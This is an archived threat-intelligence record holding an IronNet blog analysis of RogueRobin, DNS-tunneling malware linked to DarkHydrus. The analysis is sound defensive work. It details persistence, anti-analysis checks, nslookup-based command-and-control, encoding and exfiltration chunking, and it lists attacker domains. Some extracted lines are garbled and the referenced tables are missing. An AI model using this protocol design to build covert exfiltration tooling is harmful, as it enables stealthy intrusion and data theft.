{
    "id": "11825a7c-572c-4128-8ef5-c793e1c46c83",
    "created_at": "2023-01-12T15:03:42.024037Z",
    "updated_at": "2025-03-27T02:16:06.550284Z",
    "deleted_at": null,
    "sha1_hash": "ec67a30af8da467c28305dd08b55060b7fa5c148",
    "title": "2020-02-06 - DNS Tunneling Series, Part 3- The Siren Song of RogueRobin",
    "authors": "",
    "file_creation_date": "2022-05-28T15:11:34Z",
    "file_modification_date": "2022-05-28T15:11:34Z",
    "file_size": 4291223,
    "plain_text": "# DNS tunneling series, part 3: The siren song of RogueRobin\n\n**ironnet.com/blog/dns-tunneling-series-part-3-the-siren-song-of-roguerobin/**\n\n\n-----\n\nFeb 6, 2020\n\n_[NOTE: This is part 3 of this DNS Tunneling series. Be sure to check out part 1 (\"Chirp of the PoisonFrog\") and part 2 (\"A glimpse into](https://ironnet.com/blog/chirp-of-the-poisonfrog)_\nglimpse\").\n\n**_Overview_**\n\n[In this blog post, we examine a DNS tunneling malware, known as RogueRobin, that has been associated with the DarkHydrus threat group.](https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/)\nDarkHydrus has been linked to the Iranian government and largely uses spear-phishing and credential harvesting attacks on government and\neducational institutions.\n\nThere are two variants of RogueRobin that we will be looking at, one written in PowerShell and another compiled as a .NET executable. Both\nversions are very closely related but vary in significant ways, particularly when it comes to the communications. Our goal for this post is to\nhighlight those differences where appropriate.\n\nThe core of RogueRobin’s DNS tunneling mechanism involves encoding of DNS requests and replies of various resource record types\nbetween the victim host and its controller. These communications contain specifically encoded DNS labels and responses that implement a\n[covert communication channel. In contrast, the previous two DNS tunneling samples we examined, PoisonFrog and](https://ironnet.com/blog/chirp-of-the-poisonfrog/) [Glimpse, heavily relied on](https://ironnet.com/blog/a-glimpse-into-glimpse/)\nthe contents of resolved IP addresses via A record records. Although the communications may be different, the overall code flow of both\nvariants are the same. Each variant periodically checks in with the controller for waiting jobs to perform. Then they receive and perform these\ntasks and send the results back to the controller. A more detailed breakdown of how these steps are accomplished by each variant is\ndescribed below.\n\n**_Samples_**\n\n**_Startup and Persistence Mechanisms_**\n\nThe RogueRobin .NET variant first checks its command line arguments for the parameter st:off. If found, it disables its persistence mechanism,\nwhich we will describe later in the post. Another potential command line parameter is pd:off which disables the display of a decoy PDF. This\ndata is expected to be contained within one of the program’s variables and, if so, is saved to %TEMP%\\doc.pdf. In this sample, no data was\npresent. The RogueRobin PowerShell variant doesn’t contain any code to display a decoy PDF.\n\n\n-----\n\not ogue ob a a ts co ta ec a s s to e su e pe s ste ce ac oss eboots o e e, t ey acco p s t s s g t y d e e t ays\nThe .NET variant modifies the Run key in HKEY_CURRENT_USER, adds the value of OfficeUpdateService and points it to a VBScript it has\nwritten to %PUBLIC%\\Documents\\OfficeUpdateService.vbs. This VBScript executes its own executable, a copy of which it places in\n%PUBLIC%\\Documents\\OfficeUpdateService.exe. Below is an example of VBScript code for the .NET variant.\n\nConversely, the PowerShell variant creates a shortcut file (.lnk) in the user’s Startup folder, places a copy of itself in %APPDATA% as\nOneDrive.ps1,and creates a batch file that executes OneDrive.ps1 in a hidden window. This copy of the RogueRobin script is embedded in\ncompressed form in the running PowerShell code and is identical except the one set to execute from the batch file has its persistence code\nremoved. Below is an example of the setup for the PowerShell variant.\n\n**_Anti-sandboxing/Anti-analysis_**\n\nBoth the PowerShell and .NET RogueRobin variants perform a series of checks to ensure they are not being run in a sandbox or analysis\nenvironment. They do this by performing the following checks and abort if any of them are true:\n\nAlthough there are many similarities between the PowerShell and the .NET variants of RogueRobin, such as function names and overall code\nflow, there are significant differences, particularly in the way Command and Control (C2) and data encoding are achieved. For the remainder of\nthe blog post, we will discuss each variant individually, pointing out notable similarities and differences where appropriate.\n\n**_PowerShell Variant_**\n\n**Issuing DNS Queries**\n\nDNS queries are the mechanism by which RogueRobin communicates with its controller. The communication is performed by a function called\n“query.” To perform these queries, RogueRobin directly invokes the native Windows binary nslookup.exe. With nslookup.exe, the malware\nappends the various parameters necessary to build a command line to be executed, generating the DNS request. It will then parse nslookup’s\noutput which constitutes the DNS reply. Because it is running as a PowerShell script, nslookup can be invoked directly by the script. Before\neach DNS query, ipconfig/flushdns is issued to ensure DNS results are not being stored by local DNS cache. Once the cache has been\nflushed, it builds the nslookup command as follows:\n\nnslookup.exe -timeout=<timeout> -q=<mode> <query>.<domain> <server>\n\nHere we break down the command, where:\n\n<timeout>: The value to wait for a reply (defaults to 5 seconds)\n<mode>: DNS resource record type (A, AAAA, AC, SRV, SOA, TXT, MX, CNAME)\n\n\n-----\n\nque y e S abe co ta g t e tu e ed data to be decoded by t e co t o e, t e o at o c be d scussed ate t s\nblog post\n<domain>: One of the DNS domains listed below\n<server>: An authoritative name server to be used (can be blank)\n\nRogueRobin makes use of a DNS resource record of type “AC.” This mode is not a real DNS record type and is used solely for use with this\nmalware. This mode appears to be able to receive tunnelled communications as either an A or CNAME-style record. For AC mode, nslookup\ncommands are built differently than normal queries but are sent out as normal type A records as follows:\n\nnslookup.exe -timeout=<timeout> -q=a <query>.ac.<domain> <server>\n\nThe “query” function can perform several notable functions. It uses a helper function called “roundRobin” which simply rotates, in round robin\nfashion, to the next item in a list passed to it. It invokes this in order to rotate the DNS domains used for each query performed. It can also do\nthis for the DNS resource record types, which it calls “modes,” used to perform a query. Whether to change the mode can be specified\nmanually but roundRobin will default to the value specified in the global variable “hybridMode” which is set to true.\n\nThe query function also has the ability to specify an authoritative DNS server to use. It maintains this server address in a global variable called\n$Global:server. In the PowerShell variant we analyzed, this value was left blank which will cause the malware to use the DNS server used by\nthe victim host.\n\nFor every DNS request sent, the associated DNS reply will be checked for the strings timeout, UnKnown can, or Unspecified error. If this\noccurs, it will perform the query again using a new domain. It will also check the reply for text containing 00900, regular expression 1.2.9.\\d+,\nor 2200:: and return cancel if any are found.\n\nIf an exception occurs when trying to perform a DNS request and/or receive a reply, the function will sleep for the amount of time in seconds\nspecified by the global variable $sleep in addition or subtraction of a random value chosen using the equation jitter * sleep / 100. Using the\nvalues found in this variant, the minimum and maximum sleep times would be 2.4 and 3.6 seconds respectively if left unchanged.\n\nThe following list names the domains used by the PowerShell variant:\n\nanyconnect.stream\nbigip.stream\nfortiweb.download\nkaspersky.science\nmicrotik.stream\nowa365.bid\nsymanteclive.download\nwindowsdefender.win\n\n**Registering With The Controller**\nRogueRobin begins by registering itself with its controller via DNS. All communications with this variant are performed using DNS and the\nvictim registration process is no exception. This is done by performing a DNS request for <pid>.<domain>. For example, if the PID for\npowershell.exe is 4114, then a request might be issued for 4114.anyconnect.stream.\n\nIf registration is successful, the controller will send back a DNS response containing the victim host’s identifier to be saved and used in future\ncommunications. This will be extracted by RogueRobin’s “magic” function using the “getid” state which we will explain later in the blog post.\n\nRogueRobin will also issue test queries using various DNS resource record types to identify which ones are successful. These test queries are\nas follows:\n\nA\nAAAA\nAC (only used by RogueRobin, actually an A record but adds the “.ac” label before the domain)\nCNAME\nMX\nTXT\nSRV\nSOA\n\nRogueRobin refers to these DNS resource record types internally as the “mode.” Once this information is compiled, a pipe-separated string of\nwhich resource record types were successful and which were not will be sent using a jobID of 2. An example of this string is as follows:\n\nA:1|AAAA:1|AC:1|CNAME:1|MX:1|TXT:1|SRV:1|SOA:1\n\nAdditionally, victim information will also be compiled and sent back to the controller with a jobID of 1. That victim information includes the\nfollowing values and configuration parameters, which are combined into a pipe-separated string prior to transmission to the controller:\n\nIP address\n\n\n-----\n\no a\nComputer name\nUser name\nIf the logged on user has administrative privileges\nIf communications will have “garbage” inserted into the message (explained later)\nIf startup persistence was enabled\nIf hybrid mode is enabled\nSleep time\nJitter time (sleep value variance)\n\nOnce testing is complete, RogueRobin’s main functionality begins. The main functionality consists of an infinite loop but will break out of this\nloop under certain conditions. Encoded labels in DNS requests from the infected victim host are used to ask the controller if there are any\nwaiting jobs to be performed and, if so, another request will be made requesting the actual job data be sent back. The controller, in turn,\nresponds to these DNS requests in the form of DNS replies containing encoded responses. These encoded responses are parsed by the\n“magic” function.\n\n**Magic Function**\nThe magic function is responsible for extracting tunneled data from encoded DNS replies sent by the controller. This function operates on one\nDNS reply at a time so any looping that needs to be done, such as receiving larger jobs, are handled by the calling function.\n\nThe magic function takes a parameter called “state” that determines how to parse the controller’s DNS replies based on the type of operation\nbeing performed and also takes into account the current “mode” or DNS resource record type returned. It has the ability to extract three types\nof information received:\n\nhaveJob: Checks if there are any waiting jobs or tasks\ngetid: D numbers can be extracted to be used to reference a particular job or task identifier\ngetjob: Extracts job data from the DNS reply based on a jobID\n\nThe table below summarizes the magic function and the various ways from which data is extracted from DNS replies.\n\n\n-----\n\n**Payload Encoding**\n\nAnother important characteristic to understand is how RogueRobin encodes and decodes the payload data it is transmitting and receiving.\nWhen using the word “encoding” or “encoded,” we are referring to data that has been processed by a function called insertGarbage. At a\nminimum, this function takes the plaintext data, converts it to UTF8, and then base64-encodes. Additionally, if the global boolean variable\ncalled “hasGarbage” is set to “1,” it will then insert a random character in the set [a-z0-9=/] at every third character in the base64-encoded\nstring. dThe removeGarbage function performs this operation in reverse in such cases where it needs to decode data received from its\ncontroller.\n\n**PowerShell Main DNS Tunneling Operations**\n\nAfter registration is complete, RogueRobin will enter its main DNS tunneling loop where it starts by checking to see if there are completed or\nfailed jobs which were processed in a previous iteration. These jobs are managed as native Windows jobs and are accessed by using\nPowerShell “job” cmdlets such as Start-Job and Receive-Job. This enables the malware author to offload much of the overhead associated\nwith managing a job queue. Any job results waiting will be sent to the controller using the “spliting” function, which we will discuss later.\n\nNext, a DNS query is issued using the following format:\n\n<victim ID>-<3 random characters in [a-z0-9]>X.<domain>\n\nOnce a response is received, it will use regex to determine if the response was in the proper format. The regex expression used is dependent\nupon which DNS record type, or mode, is being handled. The table below illustrates which expressions are used with which modes:\n\n\n-----\n\nThese regular expressions are used to perform initial sanity checks on the controller’s responses and set flags which track whether the\nresponse was an A record or AAAA record. If it is determined the response was an AAAA record, the magic function will be called to extract\nthe jobID out of the DNS reply. If this function returns a value of 0, this will be treated as a request to cancel the transaction. If an A record is\nreturned, the malware will combine the first two octets of the “resolved” IP address and use that as the jobID. In the case of all the other\nmodes, the jobID will be the numbers preceding the dash (see the table above).\n\nOnce the jobID has been extracted, RogueRobin will call the “gettingJob” function to perform further DNS queries to receive a pending job from\nits controller. The gettingJob function is responsible for performing DNS queries requesting encoded job data until there is no more data to be\nreceived.\n\nThe gettingJob function requests job data associated with the jobID by performing the following DNS query:\n\n<victim ID>-<jobID>-<offset>.<domain>\n\nor, if AC mode is enabled:\n\n<victim ID>-<jobID>-<offset>.ac.<domain>\n\nIf the DNS reply results in a “cancel” message, the receive loop will be broken. Otherwise, it passes the received message to the magic\nfunction with a state of “getjob” for extraction. For the getjob state, this function returns an array of three elements: the encoded job data, an\n“isMore” flag value indicating if more data needs to be sent, and the offset within the data stream to which this data belongs. Each iteration of\nthis loop builds a buffer that accumulates the job data. RogueRobin will continue to accumulate more job data via DNS requests until the\nisMore data flag is set to false or a cancellation message is received.\n\nOnce the job has been received in full by the victim host, it checks to see if the command data is the string “cancel” and cancels the operation\nif so. Otherwise, the data is sent to the “removeGarbage” command to be decoded and then various regexes are used to parse the command\nreceived. The possible commands are as follows:\n\n**Spliting Function - Sending Data Back To The Controller**\n\nThe spliting function is responsible for preparing and sending data to the controller. It is used to transmit status messages, job results, and file\ndata. The spliting function takes three parameters: the data to be sent, a boolean value indicating whether “garbage” should be inserted into\nthe encoded data, and the jobID with which the data is associated. The messages are packaged and sent to the controller as DNS requests.\nFor messages that need to be broken up, multiple DNS messages will be sent until all the data is transmitted.\n\nThis function always starts by UTF8-encoding and then base64-encoding the data it is given. Additionally, if insertion of garbage is specified,\nRogueRobin will insert “garbage” characters into its communications if the hasGarbage global boolean flag has been set to true. If the flag is\ntrue, the “insertGarbage” function is first called, passing to it the data stream into which garbage should be inserted. This function will then\ninsert a random character in the set [a-z0-9=/] at every third character in the base64-encoded string.\n\n\n-----\n\ns e stated ea e, t e sp t g u ct o tu e s essages to t e co t o e t e o o S equests a s g e essage s too o g o a\nsingle transmission, that message must be broken into a series of smaller messages and each of those must be sent as individual DNS\nrequests. To do this, RogueRobin chooses a random value between two variables min_query_size and max_query_size which it then uses as\na truncation point for the current partial message. This partial message, or message chunk, will be tunneled to the controller as a DNS request.\nThe malware will maintain a variable called offset which it uses to track the position in the exfiltrated data where the next transmission should\nbegin. RogueRobin will continue breaking up messages into chunks this way until the entire encoded message has been transmitted. In this\nversion, the minimum and maximum query sizes were 30 and 43, respectively, although these can be easily changed.\n\nMessages destined for the controller using the spliting function will be sent as follows:\n\n<victim ID>-<jobID>-<offset><isMore flag>-<message data>.<domain>\n\nMessages with the AC mode being enabled will be sent as follows:\n\n<victim ID>-<jobID>-<offset><isMore flag>-<message data>.ac.<domain>\n\nFor each DNS request sent, a DNS reply will be received and each will be checked for the following:\n\n**_.NET Variant_**\n\nThe .NET variant is very closely related to its PowerShell cousin in that it uses the same general code flow and DNS tunneling mechanism but\nvaries in the underlying details of communications.\n\n**Issuing DNS Queries**\n\nThe .NET variant issues DNS queries in much the same manner as its PowerShell version with the exception that the .NET version spawns a\nhidden PowerShell process in order to execute the nslookup.exe command. The domain list is also changed to the following four entries:\n\nakdns.live\nakamaiedge.live\nedgekey.live\nakamaized.live\n\nThe .NET variant also introduces the concept of DNS request types. These request types, “a” through “d,” determine how the label for the DNS\nrequest is going to be built. “Encoding” in the table below refers to the “number_to_word” encoding described later. The following table\nillustrates the request types and how they are structured:\n\nOnce the label is built, a domain from its domain list is appended to the end. The selected domain is used in the building of the nslookup\ncommand line which is done similarly to its PowerShell cousin but with one significant change. Regardless of the request type, if the DNS\nrecord type (mode) is AC, RogueRobin will always append a hyphen and two random characters before the domain as follows:\n\nnslookup.exe -timeout=<timeout> -q=<mode> <query>-<2 random characters>.<domain> <server>\n\n\n-----\n\ne o o g a e otab e d e e ces o t e o e S e a a t\n\nDefault <timeout> value is set to 10 seconds\n<2 random characters> which are obtained from a call to Path.GetRandomFilename\nJitter value is set to 25\n\nAdditionally, before each DNS query, .NET RogueRobin checks to see if a debugger is attached with a call to Debugger.IsAttached. If a\ndebugger is attached, it will issue a DNS query as follows:\n\nnslookup.exe -timeout=<timeout> -q=<mode> 676f6f646c75636b.gogle[.]co <server>\n\n676f6f646c75636b is the hexadecimal representation of the string goodluck.\n\nRegardless of which query will be performed, they are all done in a hidden PowerShell window whose working directory is set to\nEnvironment.SpecialFolder.CommonDocuments which translates to %PUBLIC%\\Documents\\ on Windows 7.\n\nAfter issuing a query, the result is tested against the following regular expression:\n\n216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.mic\n\nIf there is a match, this function returns cancel. If there is no match, it will check the result for:\n\ntimeout|UnKnown can|Unspecified error\n\nwhich causes the function to return the false string of “$$FALSE$$.” It will also test the result for:\n\ncanonical name|mx|namerserver|mail server|address\n\nThis regex, representing the success case, will return the result representing the DNS reply to the calling function.\n\n**Registering with the Controller**\n.NET RogueRobin registers itself with its controller in a slightly different manner than the PowerShell variant. Instead of issuing a query for\n<pid>.<domain> as was done in the previous case, it issues a request type “a” DNS query. As stated before, a translation function called\nnumber_to_word is used to encode the various PID digits as letters.  If .NET RogueRobin were registering a victim with the same PID as in\nthe previous PowerShell example (4114), the resulting DNS query would be aliilc.anyconnect.stream.If registration is successful, the controller\nwill return a DNS response containing the embedded victim host’s identifier (victim ID) to be saved and used in future communications. This\nvictim ID will be passed along to, and extracted by, RogueRobin’s “magic” function using the “getid” state. This victim ID will be used for future\ncommunications instead of the PID. Test queries will also be issued, cycling through the various DNS resource record types, though now the\nDNS requests will be of request type “b.”\n\nOnce testing is complete, it will use the spliting function to send the same pipe-separated query test string and victim information as its\nPowerShell variant with the exception that the victim information string has |cs appended to the end. The “cs” string may indicate it is part of a\nRogueRobin version written in C#. An example of this string is:\n\n172.16.99.201|WIN-7VM|WORKGROUP|testvm|10|0|1|1|3|25|cs\n\n**Number-to-Word Encoding**\nOne of the encoding mechanisms used in the .NET RogueRobin is “number_to_word” encoding. This function uses simple substitution to\nconvert a number to a letter. This conversion is summarized in the table below:\n\n\n-----\n\nAny character processed by this function that is not 0 through 9 will be left as is. The “word_to_number” function, used in other parts of the\nmalware, performs this encoding in reverse, converting letters into their associated number values using the same table.\n\n**Magic Function**\n\nThe “magic” function for the .NET variant of RogueRobin is similar to the PowerShell variant’s, but differs in several ways. First, it builds a\nregex to match on any of the DNS domains contained within its domain list. PowerShell, on the other hand, simply populates the regular\nexpression with the currently operational domain. Thus, where the table below refers to <domain> for brevity, in actuality, the regex expression\nbuilt at runtime would be:\n\n(akdns.live|akamaiedge.live|edgekey.live|akamaized.live)\n\nThis expression will match on any of the active domain names.\n\nSecond, .NET RogueRobin chooses to encode the number values with the number_to_word function so many of the regex expressions have\nupdated that pattern to match word characters (\\w) instead of digits (\\d).\n\nFinally, the .NET variant makes use of two character classes it calls separator and non-separator. When regular expressions are built to match\nvarious parts of the DNS reply, the .NET variant inserts, at runtime, the regular expression representing the character class needed. In this\nvariant, the “separator” [sic] regex is [r-v] representing the characters “r” through “v” and the “not_seperator” [sic] classes is [^r-v\\s]\nrepresenting any characters except “r” through “v” and any whitespace character. For brevity and clarity, these were inserted inline with the\nregular expression matching table below, although it should be cautioned that these partial regex strings are inserted as variables and can\neasily be changed.\n\n\n-----\n\nIt should be noted that the magic function extracts data from a single DNS reply. It is up to the calling function to generate the necessary DNS\nrequests and accumulate the extracted data accordingly.\n\n**.NET Main DNS Tunneling Operations**\nThe .NET variant begins its main operations by sleeping for 1 second and then checking to see if Google Drive mode, called “x_mode,” is\nenabled . If enabled, this variant will attempt to communicate using this capability. However, this alternate communications channel will not be\ndiscussed here as it is out of scope for this blog post. Next, this variant will check for tasks by issuing a request type “b” DNS query. It will use\nregex to extract that portion of the DNS reply that requires parsing of the jobID. The responses are extracted as follows:\n\nIt will then use the extraction mechanisms identified in the table above to determine if the received DNS reply indicates the presence of a job\nwaiting. If so, the malware will begin issuing the necessary request type “c” DNS requests in order to receive its job data.\n\n\n-----\n\ne co t o e espo d t a e coded S ep y o c ogue ob e t act t e ecessa y data us g t e ag c u ct o t a\nstate of getjob. This function returns the command length, a flag indicating if there is more data to be sent (isMore flag), and the command data\nitself. Other than the command data itself, the rest of the data extracted is used to control the issuance of DNS requests for more data until all\ncommand data is properly received. If any error conditions are met, such as the command having a length of 0, “cancel” will be returned.\n\nUnless “cancel” is received, RogueRobin will decode using the word_to_number function and then convert the hexadecimal strings in the\ncommand to their corresponding ASCII characters. If successful, the command is then passed to the taskHandler command where the\nreceived command is executed in a separate thread. The process then repeats .\n\nThe taskHandler function is responsible for parsing the received command data. Each command is parsed in a different way and which\ncommand has been issued is determined by more yet regex matching.\n\nThe following table lists the commands processed by the .NET variant. Although several of the commands are the same as those found in its\nPowerShell counterpart, several have also been added and deleted.\n\n**Spliting Function - Sending Data Back to the Controller**\n\nThe .NET version of the spliting function has the same purpose and takes the same three parameters as its PowerShell cousin:\n\nThe data to be sent\nA boolean value indicating whether the data should be encoded\nThe jobID with which the data is associated\n\nHowever, the underlying communications protocol is, once again, different and instead communicates using request type “d.” First, if the\nboolean parameter passed is true, the .NET variant will execute “insertGarbage” which involves simply converting the data bytes to their\nhexadecimal representation. Next, this variant checks to see if x_mode is enabled and, if so, transmits the data using that mechanism.\nOtherwise, a random value is chosen between min_query_size and max_query_size (30 and 32, respectively in the case of our sample) and is\nused as a message chunk size. It will extract the chunk size number of characters for transmission using a single DNS query. If the chunk size\nis greater than the length of the message, it will set the isMore flag to 0, indicating the transfer of the message to its controller is now complete.\n\nNext, it will choose a random “separator” character. This is a randomly chosen character in the set [r-v]. RogueRobin will use these\nparameters to build a request type “d” DNS request which is then sent to the controller. It will continue to break messages up for transmission\nuntil the entire message has been sent. Each query will yield a DNS reply from the controller and each reply will be checked as follows:\n\n**Conclusion**\n\nAnytime an adversary acquires the ability to control both the send and receive side of communications, the potential to perform tunneling\nexists. Coupling this with a chatty protocol that is necessary to the proper functioning of any Internet-connected network such as DNS provides\nthe adversary a built-in mechanism by which to blend in with noise hide in plain sight and increase the chances of going undetected\n\n\n-----\n\ns se es o b og posts d scussed a e e a p es o a a e t at use S tu e g to co u cate t oug t e et od o S\ntunneling used is similar (e.g., encoded subdomain labels and encoded responses), the structure, encoding, and record type often differed\nbetween the samples. PoisonFrog and Glimpse were similar both from a coding and operational standpoint, though Glimpse added text mode\nwhich uses TXT resource records to increase the throughput of data from the controller. For RogueRobin, the malware authors went so far as\nto invent an entirely new DNS record type altogether in their data exfiltration pursuits.\n\n[Similar to the malware discussed in our prior posts (Chirp of the PoisonFrog and](https://ironnet.com/blog/chirp-of-the-poisonfrog/) [A Glimpse into Glimpse), RogueRobin makes use of encoded](https://ironnet.com/blog/a-glimpse-into-glimpse/)\nsubdomain labels and responses so detection methods between the three types of malware discussed in this series will be similar. The\n[IronDefense Network Traffic Analysis platform combines several behavioral detection methods alongside historical network information to](https://ironnet.com/irondefense)\ndetect the C2 techniques used by the malware examined in this blog series. IronNet's Threat Research team will continue to examine malware\nand share findings with the community.\n\nAbout Ironnet\n\nFounded in 2014 by GEN (Ret.) Keith Alexander, IronNet, Inc. (NYSE: IRNT) is a global cybersecurity leader that is transforming how\norganizations secure their networks by delivering the first-ever Collective Defense platform operating at scale. Employing a number of former\nNSA cybersecurity operators with offensive and defensive cyber experience, IronNet integrates deep tradecraft knowledge into its industryleading products to solve the most challenging cyber problems facing the world today.\n\n[Back to IronNet Blog](https://www.ironnet.com/blog)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-06 - DNS Tunneling Series, Part 3- The Siren Song of RogueRobin.pdf"
    ],
    "report_names": [
        "2020-02-06 - DNS Tunneling Series, Part 3- The Siren Song of RogueRobin.pdf"
    ],
    "threat_actors": [
        {
            "id": "4fe925e8-95e5-4a63-9f96-4d0f9bedac08",
            "created_at": "2022-10-25T15:50:23.469077Z",
            "updated_at": "2025-03-27T02:00:55.478056Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "DarkHydrus"
            ],
            "source_name": "MITRE:DarkHydrus",
            "tools": [
                "Mimikatz",
                "RogueRobin",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6efb28db-4d91-46cb-8ab7-fe9e8449ccfc",
            "created_at": "2023-01-06T13:46:38.772861Z",
            "updated_at": "2025-03-27T02:00:02.914846Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "Obscure Serpens",
                "LazyMeerkat",
                "G0079"
            ],
            "source_name": "MISPGALAXY:DarkHydrus",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5b04780e-7b64-4e62-b776-c6749ff7dec8",
            "created_at": "2022-10-25T16:07:23.531741Z",
            "updated_at": "2025-03-27T02:02:09.84903Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "ATK 77",
                "DarkHydrus",
                "LazyMeerkat",
                "Obscure Serpens"
            ],
            "source_name": "ETDA:DarkHydrus",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Mimikatz",
                "Phishery",
                "RogueRobin",
                "RogueRobinNET",
                "Trojan.Phisherly",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535822,
    "ts_updated_at": 1743041766,
    "ts_creation_date": 1653750694,
    "ts_modification_date": 1653750694,
    "files": {
        "pdf": "https://archive.orkl.eu/ec67a30af8da467c28305dd08b55060b7fa5c148.pdf",
        "text": "https://archive.orkl.eu/ec67a30af8da467c28305dd08b55060b7fa5c148.txt",
        "img": "https://archive.orkl.eu/ec67a30af8da467c28305dd08b55060b7fa5c148.jpg"
    }
}